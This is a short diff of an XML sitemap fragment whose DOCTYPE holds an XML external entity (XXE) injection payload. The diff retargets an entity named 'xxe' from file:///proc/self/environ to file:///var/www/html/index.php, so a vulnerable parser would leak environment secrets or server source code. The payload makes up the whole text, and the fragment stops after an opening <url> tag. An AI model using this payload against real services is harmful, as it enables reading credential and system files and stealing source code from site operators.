@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE urlset [
-  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
+  <!ENTITY xxe SYSTEM "file:///var/www/html/index.php">
 ]>
 <urlset>
   <url>
